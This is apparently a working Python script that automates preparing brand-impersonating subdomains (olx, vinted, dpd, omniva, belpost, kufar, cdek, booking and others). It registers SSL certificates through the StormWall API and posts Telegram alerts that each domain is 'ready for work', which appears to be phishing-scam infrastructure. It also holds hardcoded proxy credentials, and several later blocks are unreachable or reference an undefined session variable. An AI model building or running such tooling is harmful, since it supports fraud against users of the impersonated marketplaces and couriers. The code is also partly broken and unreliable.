import asyncio
import datetime

import aiohttp
import requests
from aiogram import Bot

import main_config
from models import base
from models import *


async def check_domains():
    await base.on_startup()
    timeout = aiohttp.ClientTimeout(total=10)
    session = aiohttp.ClientSession(timeout=timeout)
    bot = Bot(main_config.API_TOKEN)
    eu_subs = ['sms.', 'olx.ro.', 'olx.pt.', 'ctt.', 'dpd.lv.', 'dpd.lt.', 'omniva.lt.', 'omniva.lv.', 'mbway.', 'fancourier.', 'uber.', 'auspost.', 'gumtree.au.',
               'blocket.', 'booking.', 'postnord.', 'olx.pe.', 'uber.sw.', 'uber.es.', 'marktplaats.', 'vinted.pt.', 'vinted.nl.', 'anibis.',
               'kufar.', 'evropochta.', 'belpost.', 'cdek.']
    by_subs = ['kufar.', 'evropochta.', 'belpost.', 'cdek.', 'blocket.', 'booking.', 'postnord.', 'olxpe.', 'ubersw.', 'uberes.', 'marktplaats.', 'vintedpt.', 'vintednl.', 'anibis.']
    res = requests.get('https://api.stormwall.pro/user/service/24718/domain-list',
                       cookies={'api_access_token': main_config.STORMWALL_TOKEN},
                       proxies={'https': 'http://Q6mtf5TWbS:4uKihOHVtv@45.145.91.160:61072'}).json()
    domains = await DomainOrder.query.where((DomainOrder.heat == False) & (DomainOrder.country != 'pl')).gino.all()
    for d in domains:
        if d.country == 'eu':
            subs = eu_subs
        else:
            subs = by_subs
        try:
            error = False
            for s in subs:
                try:
                    dom = 'https://{}{}'.format(s, d.domain)
                    await session.get(dom)
                    print('{} OK'.format(dom))
                except:
                    error = True
                    dom = 'https://{}{}'.format(s, d.domain)
                    print('{} ERROR'.format(dom))
            if error:
                continue
            await d.update(heat=True).apply()
            if d.country == 'eu':
                await bot.send_message(-000,
                                       '🇪🇺 Новый домен готов к работе 🇪🇺')
            else:
                await bot.send_message(1496852230,
                                       '🇧🇾 Домен {} готов к работе 🇧🇾'.format(d.domain))
                await bot.send_message(000,
                                       '🇧🇾 Домен {} готов к работе 🇧🇾'.format(d.domain))
        except Exception as e:
            print(f"{d.domain} {e}")
    return
    for d in res['list']:
        dom = d['domain_name'].split('.')[1]
        if dom != 'xyz' and dom != 'icu' and dom != 'cyou' and dom != 'by':
            if not dom.startswith('pl-'):
                db = await DomainOrder.query.where(
                    (DomainOrder.domain.contains(dom)) & (DomainOrder.heat == False)).gino.first()
                if db:
                    res2 = requests.put(
                        'https://api.stormwall.pro/user/service/24718/domain/{}/ssl/le'.format(d['domain_id']),
                        cookies={'api_access_token': main_config.STORMWALL_TOKEN}).json()
                    print(d['domain_id'])
                    print(d['domain_name'])
                    print(res2)
                    try:
                        for sub in subs:
                            await s.get('https://{}{}.{}'.format(sub, dom, d['domain_name'].split('.')[2]))
                        await db.update(heat=True).apply()
                        await bot.send_message(-000,
                                               '🇪🇺 Новый домен готов к работе 🇪🇺'.format(dom))
                    except Exception as e:
                        print(f"{db.domain} {e}")
    #by
    subs = ['kufar.', 'evropochta.', 'belpost.', 'cdek.']
    for d in res['list']:
        try:
            print(d['domain_name'])
            dom = d['domain_name'].split('.')[2] # .by
            if dom == 'by':
                db = await DomainOrder.query.where(
                    (DomainOrder.domain.contains(d['domain_name'].split('.')[1]))
                    & (DomainOrder.heat == False)
                ).gino.first()
                if db:
                    print(db)
                    res2 = requests.put(
                        'https://api.stormwall.pro/user/service/24718/domain/{}/ssl/le'.format(d['domain_id']),
                        cookies={'api_access_token': main_config.STORMWALL_TOKEN}).json()
                    try:
                        for sub in subs:
                            await s.get('https://{}{}.by'.format(sub, d['domain_name'].split('.')[1]))
                        await db.update(heat=True).apply()
                        await bot.send_message(1496852230,
                                               '🇧🇾 Домен {} готов к работе 🇧🇾'.format(d['domain_name']))
                        await bot.send_message(000,
                                               '🇧🇾 Домен {} готов к работе 🇧🇾'.format(d['domain_name']))
                    except Exception as e:
                        print(f"BY {db.domain} {e}")
        except:
            pass
    return
    domains = await DomainOrder.query.where((DomainOrder.heat == False) & (DomainOrder.country == 'eu')).gino.all()
    s = aiohttp.ClientSession()
    subs = ['sms.', 'olxro.', 'olxpt.', 'dpdlv.', 'dpdlt.', 'omnivalt.', 'omnivalv.', 'cdek.', 'kufar.', 'belpost.',
            'evropochta.', 'ctt.']
    sites = ['kufar', 'cdek', 'evropochta', 'belpost', 'sms', 'bazos', 'sbazar', 'omnivalt', 'omnivalv', 'dpdlv',
             'dpdlt', 'correos', 'gumtree', 'olxpt', 'ctt', 'leboncoin', 'olxro']
    for d in domains:
        try:
            for site in sites:
                await s.get('https://{}.{}'.format(site, d.domain))
            await d.update(heat=True).apply()
            for a in main_config.ADMIN_IDS:
                await bot.send_message(a, 'Домен {} прогрет и готов к работе'.format(d.domain))
        except Exception as e:
            print(f"{d.domain} {e}")
    domains = await DomainOrder.query.where((DomainOrder.heat == False) & (DomainOrder.country == 'by')).gino.all()
    sites = ['kufar', 'cdek', 'evropochta', 'belpost', ]
    for d in domains:
        try:
            for site in sites:
                await s.get('https://{}.{}'.format(site, d.domain))
            await d.update(heat=True).apply()
            for a in main_config.ADMIN_IDS:
                await bot.send_message(a, 'Домен {} прогрет и готов к работе'.format(d.domain))
        except Exception as e:
            print(f"{d.domain} {e}")
    await s.close()
    await bot.close()
    

if __name__ == '__main__':
    asyncio.get_event_loop().run_until_complete(check_domains())